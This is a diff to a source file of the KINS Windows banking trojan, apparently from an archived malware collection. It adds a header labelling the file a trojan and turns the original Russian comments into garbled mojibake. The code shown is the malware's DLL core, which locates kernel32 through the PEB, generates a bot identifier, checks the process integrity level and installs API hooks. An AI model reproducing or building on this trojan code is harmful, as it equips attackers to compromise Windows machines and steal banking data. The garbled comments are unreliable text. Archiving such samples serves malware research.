@@ -1,3 +1,14 @@
+/*
+  name      KINS
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <shlobj.h>
 #include <shellapi.h>
@@ -45,7 +56,7 @@ static DWORD WINAPI newThreadEntryPoint(void* p)
 }
 
 /*
-	Аналог CWA(kernel32, GetProcAddress).
+	пїЅпїЅпїЅпїЅпїЅпїЅ CWA(kernel32, GetProcAddress).
 */
 void *DllCore::__GetProcAddress(HMODULE module, LPSTR name)
 {
@@ -101,9 +112,9 @@ typedef struct _PEB
 #endif
 
 /*
-	Получение хэндла kernel32.dll.
+	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ kernel32.dll.
 
-	Return - хэндл.
+	Return - пїЅпїЅпїЅпїЅпїЅ.
 */
 static HMODULE _getKernel32Handle(void)
 {
@@ -150,10 +161,10 @@ static HMODULE _getKernel32Handle(void)
 }
 
 /*
-Установка хуков.
+пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 
-Return   - true - в случаи успеха,
-false - в случаи ошибки.
+Return   - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool __inline initHooks(DWORD flags)
 {
@@ -194,10 +205,10 @@ static bool __inline initHooks(DWORD flags)
 }
 
 /*
-Установка хуков.
+пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 
-Return   - true - в случаи успеха,
-false - в случаи ошибки.
+Return   - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool __inline unInitHooks(DWORD flags)
 {
@@ -237,14 +248,14 @@ static bool __inline unInitHooks(DWORD flags)
 }
 
 /*
-	Основне данные OS.
+	пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ OS.
 
-	Return   - true - в случаи успеха,
-	false - в случаи ошибки.
+	Return   - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+	false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool __inline initOsBasic(void)
 {
-	//Версия Windows.
+	//пїЅпїЅпїЅпїЅпїЅпїЅ Windows.
 	{
 		coreDllData.winVersion = OsEnv::_getVersion();
 		if(coreDllData.winVersion < OsEnv::VERSION_XP)
@@ -259,7 +270,7 @@ static bool __inline initOsBasic(void)
 		OsEnv::_generateBotId(coreDllData.compId);
 	}
 
-	//Получение IntegrityLevel.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ IntegrityLevel.
 	if((coreDllData.integrityLevel = Process::_getIntegrityLevel(CURRENT_PROCESS)) == Process::INTEGRITY_UNKNOWN)
 	{
 		if(coreDllData.winVersion < OsEnv::VERSION_VISTA)
@@ -275,14 +286,14 @@ static bool __inline initOsBasic(void)
 }
 
 /*
-	Создание объектов.
+	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
-	Return   - true - в случаи успеха,
-	false - в случаи ошибки.
+	Return   - true - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ,
+	false - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static bool initHandles(void)
 {
-	//Глобальные объекты.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	coreDllData.stopEvent = CWA(kernel32, CreateEventW)(0, TRUE, FALSE, NULL);
 
 	if(coreDllData.stopEvent == NULL)
@@ -304,17 +315,17 @@ bool DllCore::init(HMODULE module, DWORD flags)
 	coreDllData.modules.currentModule = module;
 	coreDllData.pid = GetCurrentProcessId();
 	
-	//Основные данные OC.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ OC.
 	if(!initOsBasic())
 		return false;
 
-	//Объекты.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	if(!initHandles())
 		return false;
 
 	coreDllData.currentConfig = DllConfig::getCurrent();
 
-	//Установка хуков.
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 	if(!initHooks(flags))
 		return false;
 
